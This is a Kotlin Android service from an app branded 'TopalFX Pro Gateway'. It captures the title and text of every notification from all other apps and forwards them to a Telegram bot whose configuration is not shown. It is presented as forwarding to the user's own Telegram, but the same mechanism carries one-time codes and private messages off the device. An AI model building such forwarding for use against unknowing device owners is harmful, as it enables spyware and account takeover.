package com.topal.fx.service

import android.app.Notification
import android.content.pm.PackageManager
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Background listener service that intercepts incoming notifications
 * and forwards them instantly to the user's Telegram via Telegram Bot API.
 */
class NotificationForwarderService : NotificationListenerService() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val timeFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return

        val pkgName = sbn.packageName ?: return

        // Ignore notifications posted by our own app to avoid loops
        if (pkgName == packageName) return

        val extras = sbn.notification?.extras ?: return

        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim() ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim()
            ?: extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim()
            ?: ""

        // If title and text are both empty, skip (e.g. silent empty system pulses)
        if (title.isEmpty() && text.isEmpty()) return

        val appName = try {
            val appInfo = packageManager.getApplicationInfo(pkgName, PackageManager.GET_META_DATA)
            packageManager.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            pkgName
        }

        val currentTime = timeFormat.format(Date())

        val formattedMessage = buildString {
            appendLine("🔔 إشعار جديد")
            appendLine("━━━━━━━━━━━━━━━")
            appendLine("📱 التطبيق: $appName")
            if (title.isNotEmpty()) {
                appendLine("📌 العنوان: $title")
            }
            if (text.isNotEmpty()) {
                appendLine("💬 المحتوى: $text")
            }
            appendLine("⏰ الوقت: $currentTime")
            appendLine("━━━━━━━━━━━━━━━")
            append("🚀 عبر TopalFX Pro Gateway")
        }

        serviceScope.launch {
            TelegramConfig.sendMessage(formattedMessage)
        }
    }
}
